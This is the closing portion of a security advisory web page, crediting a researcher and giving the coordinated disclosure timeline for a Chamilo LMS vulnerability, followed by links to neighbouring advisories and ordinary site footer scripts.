<p>Ngo Wei Lin (<a href="https://twitter.com/Creastery">@Creastery</a>) of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>
<h2 id="timeline">Timeline<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h2>
<ul>
<li>2023-09-04 Vendor Disclosure</li>
<li>2023-09-06 Initial Vendor Contact</li>
<li>2023-09-12 Sent additional information to vendor regarding incomplete fixes found</li>
<li>2023-09-27 Vendor Patch Release (v1.11.26) completely fixing vulnerability</li>
<li>2023-09-29 Vendor published the vulnerability sumamry</li>
<li>2023-09-29 Mutual agreement to delay the publication of vulnerability details was reached in light of the recent <a href="https://github.com/chamilo/chamilo-lms/issues/4813">in-the-wild exploitation of Chamilo N-day vulnerability (CVE-2023-34960)</a></li>
<li>2023-11-28 Public Release</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://starlabs.sg/advisories/23/23-4224/">
    <span class="title">« Prev</span>
    <br>
    <span>(CVE-2023-4224) Chamilo LMS Dropbox Ajax File Upload Functionality Remote Code Execution</span>
  </a>
  <a class="next" href="https://starlabs.sg/advisories/23/23-4226/">
    <span class="title">Next »</span>
    <br>
    <span>(CVE-2023-4226) Chamilo LMS Work Ajax File Upload Functionality Remote Code Execution</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
</body>

</html>
